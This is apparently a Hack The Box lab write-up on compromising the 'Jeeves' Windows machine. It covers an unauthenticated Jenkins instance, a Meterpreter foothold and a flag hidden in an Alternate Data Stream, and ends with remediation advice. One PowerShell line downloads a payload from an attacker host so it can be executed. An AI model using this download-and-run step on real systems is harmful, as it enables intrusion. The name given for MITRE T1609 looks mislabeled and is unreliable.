---
title: "Hack The Box Writeup: Jeeves"
date: 2025-12-18
description: "Jenkins exploitation and data discovery in Alternate Data Streams (ADS)."
tags: ["htb", "jenkins", "ads", "windows", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

The host was compromised via an exposed Jenkins instance. Remote execution was achieved through Jenkins jobs, leading to a SYSTEM shell. The final flag was hidden within an **Alternate Data Stream (ADS)**, requiring advanced filesystem enumeration.

### Attack Chain (PTES Mapping)

#### 1. Discovery & Web Enumeration
Directory brute-forcing discovered `/askjeeves/`, which hosted the Jenkins dashboard on port 50000.
* **MITRE Technique:** [T1083](https://attack.mitre.org/techniques/T1083/) - File and Directory Discovery.

#### 2. Exploitation
A new Jenkins job was created using the "Execute Windows batch command" feature to download and execute a Meterpreter payload.
```powershell
(New-Object Net.WebClient).DownloadFile('http://<IP>/shell.exe','C:\Users\Public\shell.exe')
```
* **MITRE Technique:** [T1609](https://attack.mitre.org/techniques/T1609/) - Execution in Container/Job.

#### 3. Privilege Escalation & Flag Recovery
The `getsystem` command successfully elevated the session. The root flag was not found in the standard directory but was discovered as an **ADS** attached to `hm.txt`.
```cmd
dir /R hm.txt
more < hm.txt:root.txt
```
* **MITRE Technique:** [T1564.004](https://attack.mitre.org/techniques/T1564/004/) - Hide Artifacts: NTFS File Attributes.

### Remediation (NIST SP 800-115)

* **Access Control:** Enable authentication for all Jenkins interfaces.
* **Monitoring:** Audit PowerShell execution and the creation of Alternate Data Streams.